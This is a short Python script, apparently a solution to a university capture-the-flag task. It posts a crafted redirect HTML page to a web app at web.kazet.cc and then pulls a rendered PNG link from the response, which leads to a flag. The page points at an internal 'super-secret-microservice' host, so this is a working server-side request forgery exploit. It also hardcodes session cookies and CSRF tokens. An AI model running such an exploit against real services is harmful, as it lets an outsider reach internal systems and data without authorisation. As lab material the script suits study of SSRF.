import requests

page = open('page_redirect.html', 'r').read()
url = 'http://zad41-mimuw-finals-2023-super-secret-microservice/index.html'
page = page.replace('/hereurl', url)
recepient = 'kanshaodoroki'


cookies = {
    'csrftoken': 'oPQRVO7crKCU49QsuD3zOgmHZQ3Jrmvr',
    'sessionid': 'rt818jvdt3zozlm8njq9s1953nnbshaw',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'csrftoken=oPQRVO7crKCU49QsuD3zOgmHZQ3Jrmvr; sessionid=rt818jvdt3zozlm8njq9s1953nnbshaw',
    'Origin': 'https://web.kazet.cc:42448',
    'Referer': 'https://web.kazet.cc:42448/create',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
}

data = {
    'csrfmiddlewaretoken': '6UyzD6fquNJxcEts5M7EHc3XUmMzhcCpkzegoKcsLnbh6D9Kpf03lifuJ2F8yoXG',
    'recipient': recepient,
    'content': page,
    'template': 'normal',
}

response = requests.post('https://web.kazet.cc:42448/create',
                         cookies=cookies, headers=headers, data=data)
string = str(response.content)

print("FLAG:")


index1 = string.find("/download-png/")
index2 = string.find('">Pobierz')

to_write = (string[index1 + len("/download-png"):index2])
print("https://web.kazet.cc:42448/download-png" + to_write)
